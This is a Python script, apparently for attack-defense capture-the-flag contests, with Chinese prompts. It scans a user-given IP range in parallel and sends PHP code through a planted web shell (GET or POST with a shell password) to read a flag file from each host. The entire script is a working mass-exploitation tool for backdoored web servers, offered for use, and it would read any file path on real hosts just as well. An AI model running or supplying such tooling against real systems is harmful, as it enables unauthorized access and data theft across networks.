import multiprocessing
import requests

def GetFlag(url,method,shell_url,shell_pass,flag_url):
    if method=="GET":
        result=requests.get(url+shell_url+"?"+shell_pass+"=echo file_get_contents(\""+flag_url+"\");",timeout=1,verify=False)    #默认超时1秒
        print(result.text)
    if method=="POST":
        data={
            shell_pass:"echo file_get_contents(\""+flag_url+"\");"
        }
        result=requests.post(url+shell_url,data=data)
        print(result.text)

def main():
    try:
        ip_segment=str(input("请输入ip段（例如192.168.1）："))
        ip_start=str(input("请输入ip起始（例如1）："))
        ip_end=str(input("请输入ip结束（例如255）："))
        ip_port=str(input("请输入端口号（例如80）："))
        ip_list=[]
        for i in range(int(ip_start),int(ip_end)+1):
            ip_list.append("http://"+ip_segment+"."+str(i)+":"+ip_port)
        print("已获取目标列表："+str(ip_list))
    except:
        print("获取ip出错")

    try:
        procs=int(input("请输入并发进程数量（例如10）："))
        method=str(input("请输入请求方式（例如GET）："))
        shell_url=str(input("请输入shell地址（例如/shell.php）："))
        shell_pass=str(input("请输入shell密码（例如pass）："))
        flag_url=str(input("请输入flag位置（例如/flag）："))
        pool = multiprocessing.Pool(processes = procs)    #进程池，限制并行进程数量
        for i in ip_list:    #遍历目标列表进行获取Flag
            pool.apply_async(GetFlag, (i,method,shell_url,shell_pass,flag_url ))
        pool.close()
        pool.join()
    except:
        print("执行并发任务出错")

if __name__ == "__main__":
    main()